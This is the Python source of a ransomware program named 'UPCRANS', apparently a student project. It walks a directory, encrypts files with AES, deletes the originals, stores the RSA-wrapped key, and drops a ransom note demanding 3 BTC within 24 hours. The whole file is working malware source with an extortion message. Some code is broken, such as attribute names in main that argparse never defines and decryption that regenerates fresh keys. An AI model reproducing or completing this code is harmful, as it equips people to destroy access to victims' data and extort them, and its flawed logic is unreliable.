#    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@    #  
#    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@    #    
#    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@        #       
#    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!        #     
#    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!     #    
#    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!    #   
#    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!   #   
#    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!    #   
#    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::    #   
#    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :      # 

from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import os, sys, struct
import argparse
from Database.keygenerator import class_keys
import Database.sqlite as bbdd


if sys.version_info >= (3, 8, 0):
        import time
        time.clock = time.process_time


def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware-UPCRANS')
    parser.add_argument('-p', '--path', help='Path to start attack. Default path = %%HOME%%/', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Encrypt files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Decrypt files',
                        action='store_true')

    return parser.parse_args()


def create_Readme():
    text = '''                                                              
    @@@  @@@  @@@@@@@    @@@@@@@  @@@@@@@    @@@@@@   @@@  @@@   @@@@@@   
    @@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@ @@@  @@@@@@@   
    @@!  @@@  @@!  @@@  !@@       @@!  @@@  @@!  @@@  @@!@!@@@  !@@       
    !@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!  @!@  !@!!@!@!  !@!       
    @!@  !@!  @!@@!@!   !@!       @!@!!@!   @!@!@!@!  @!@ !!@!  !!@@!!    
    !@!  !!!  !!@!!!    !!!       !!@!@!    !!!@!!!!  !@!  !!!   !!@!!!   
    !!:  !!!  !!:       :!!       !!: :!!   !!:  !!!  !!:  !!!       !:!  
    :!:  !:!  :!:       :!:       :!:  !:!  :!:  !:!  :!:  !:!      !:!   
    ::::: ::   ::        ::: :::  ::   :::  ::   :::   ::   ::  :::: ::   
    : :  :    :         :: :: :   :   : :   :   : :  ::    :   :: : :    
                                                                        
    Sadly your computer has been infected and all your files have been encrypted.
    If you want to recover all your data, you have 24 hours to pay 3 BTC in the following wallet:
    aweuioxjvsjdñroj3084u

    In addition, you can talk with us in this chat: xxxxxxxxxx.onion

    With our deepest regret,
    ~UPCRANS team~  
    '''

    with open('README.txt', 'w') as fo:
                fo.write(text)
    return 


#Initialize both AES and RSA keys and store in class_keys
def initialize_keys():
    #Initialize keys
    keys = class_keys()
    data = (keys.AESkey, keys.PUBLIC_RSAKEY, keys.PRIVATE_RSAKEY, '0')
    bbdd.sql_insert(data)

    #Store AES key encrypted in system
    with open('fileKey' + ".upcrans", 'wb') as fo:
                key_encrypted = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
                fo.write(key_encrypted)
    return keys


# Encrypt KEY (AES) with public key (RSA).
def encrypt_key(AESkey, key):
    public_key = RSA.importKey(key)
    encryptor = PKCS1_OAEP.new(public_key)
    encrypted_key = encryptor.encrypt(AESkey)
    return encrypted_key


# Decrypt KEY (AES) with private key (RSA).
def decrypt_key(AESkey, key):
    private_key = RSA.importKey(key)
    decryptor = PKCS1_OAEP.new(private_key)
    decrypted_key = decryptor.decrypt(AESkey)
    return decrypted_key


# List files of a system
def list_files(args):
    path = '.'
    if args.encrypt == True:
        extensions = ['txt']

        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if file.split('.')[-1] in extensions:
                    files.append(os.path.join(r, file))
    else:  
        extensions = ['upcrans']

        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if file.split('.')[-1] in extensions:
                    files.append(os.path.join(r, file)) 
    return files


# Encrypt function
def encrypt(filename, infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    filesize = os.path.getsize(filename)
    outfile.write(struct.pack('<Q', filesize))

    iv = Random.new().read(block_size)
    outfile.write(iv)

    encr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(encr.encrypt(chunk))
    
    
# Encrypt file
def encrypt_file(l_files, key):
    for filename in l_files:
        with open(filename, 'rb') as fi:
            with open(filename + ".upcrans", 'wb') as fo:
                encrypt(filename, fi, fo, key)
        print ("File encrypted\n" ,filename,"===>" ,filename+".upcrans")
        os.remove(filename)


# Decrypt function
def decrypt(infile, outfile, key):
    block_size = AES.block_size #AES block_size = 16 
    chunk_size = block_size*1024 

    size_orig = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]   
    iv = infile.read(16)

    decr = AES.new(key, AES.MODE_CBC, iv)

    end_file = False

    while not end_file:
        chunk = infile.read(chunk_size)
        if len(chunk) == 0:
            break        
        elif len(chunk) % block_size != 0:
            end_file = True
            padding_length = (block_size - len(chunk) % block_size) or block_size
            chunk += (padding_length * chr(padding_length)).encode()

        outfile.write(decr.decrypt(chunk))
    outfile.truncate(size_orig)


# Decrypt file
def decrypt_file(l_files, key):
    for file_name in l_files:
        print(file_name)
        with open(file_name, 'rb') as fi:
            filename, filextensions = os.path.splitext(file_name)
            with open(filename, 'wb') as fo:
                decrypt(fi, fo, key)
        print ("File decrypted\n" ,filename)
        os.remove(file_name)

        
def main(): 
    args = parse_args()
    l_files = list_files(args)
    keys = initialize_keys()

    if args.encryption == True:
        #Encrypt files of your system
        encrypt_file(l_files, keys.AESkey)
        create_Readme()

    elif args.decryption == True:
        #Decrypt the encrypted files of your system
        decrypt_file(l_files, keys.AESkey)

    #elif option == 3:
        #Validate that encrypt and decrypt keys is working
    #    enc = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
    #    dec = decrypt_key(enc, keys.PRIVATE_RSAKEY)
    #    print(dec==keys.AESkey)

    else:
        print("No option selected")   

if __name__ == "__main__":
    main()